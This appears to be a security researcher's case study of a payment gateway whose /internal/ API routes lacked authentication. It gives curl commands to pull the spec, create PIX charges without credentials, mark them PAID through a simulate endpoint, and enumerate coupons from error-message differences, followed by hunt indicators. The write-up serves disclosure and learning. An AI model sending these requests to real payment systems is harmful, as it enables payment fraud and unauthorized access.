# `/internal/` API Auth Bypass — Payment Gateway Case Study

## Pattern Description

A payment gateway exposed backend-internal API endpoints under `/internal/*` on the **public** API subdomain with **zero authentication**. The internal API handled charge creation, payment simulation, boleto generation, and coupon validation — all reachable without any API key or session token.

## Discovery

1. Obtained full OpenAPI 185KB spec from `https://api.target.com/openapi/json` (unauthenticated)
2. Found 253 documented endpoints including `/internal/*` routes
3. Tested internal endpoints without auth — got real business logic responses (not 401)

## Affected Endpoints (verified)

| Endpoint | Auth Required | Impact |
|---|---|---|
| `POST /internal/charge/create` | **None** | Create PIX charges on any billing |
| `POST /internal/charge/simulate` | **None** | Mark charges as PAID without payment |
| `GET /internal/charge/check` | **None** | Check status of any charge |
| `POST /internal/boleto/create` | **None** | Create boletos (needed correct schema) |
| `GET /internal/boleto/get` | **None** | Get boleto details |
| `POST /internal/coupon/check` | **None** | Enumerate valid coupon codes |
| `POST /internal/charge/check-coupon` | **None** | Validate coupons against billings |
| `POST /internal/charge/up-sell` | **None** | Attempt charge upgrades |
| `GET /internal/billing/get` | **None** | Get billing details (needs `url` param) |
| `GET /internal/product/download` | **None** | Download products by billing ID |

## Reproduction Chain (CRITICAL)

### Step 1: Get OpenAPI Spec (no auth)
```bash
curl -s "https://api.target.com/openapi/json" | jq '.paths | keys'
```

### Step 2: Extract internal endpoint schemas
```bash
curl -s "https://api.target.com/openapi/json" | \
  jq '.paths | to_entries[] | select(.key | startswith("/internal/")) | {path: .key, methods: .value}'
```

### Step 3: Create a charge without any authentication
```bash
curl -s -X POST "https://api.example-pay.tld/internal/charge/create" \
  -H "Content-Type: application/json" \
  -d '{
    "paymentMethod": "PIX",
    "billingId": "<any-valid-billing-id>",
    "coupons": [],
    "customer": {
      "name": "Test",
      "cellphone": "19999999999",
      "email": "test@test.com",
      "taxId": "52998224725"
    },
    "device": {
      "kind": "browser",
      "os": "macOS",
      "name": "Chrome",
      "ip": "127.0.0.1",
      "utmParams": {}
    },
    "metadata": {}
  }'
```

Response (200): Returns a real PIX charge with QR code (brCode).

### Step 4: Simulate payment (mark as PAID without actually paying)
```bash
curl -s -X POST "https://api.example-pay.tld/internal/charge/simulate?id=<charge-id-from-step-3>"
```

Response (200): Charge status changes to PAID.

## Verification Technique: Error Message Differential

Coupon enumeration via error message differential:

- **"Not found"** → coupon doesn't exist
- **"Cannot apply this coupon"** → coupon EXISTS but can't be applied to this billing
- **Other validation errors** → coupon exists and was validated against business rules

Test without auth:
```bash
curl -s "https://api.example-pay.tld/internal/coupon/check?code=ADMIN&url=https://api.example-pay.tld/v1/billing/test"
# "Cannot apply this coupon" = coupon ADMIN exists
```

## Root Cause

The `/internal/*` route prefix was intended for server-to-server communication but auth middleware was never applied. V1/V2 routes had proper API key auth; `/internal/` was completely unguarded.

## Hunt Indicators

- `/internal/*`, `/admin/*`, `/debug/*`, `/private/*`, `/system/*` prefixes in OpenAPI specs
- Routes that don't follow the version pattern (`/v1/`, `/v2/`)
- `422 validation` instead of `401` — route handler runs before auth check
- "Cannot apply" vs "Not found" = enumeration signal
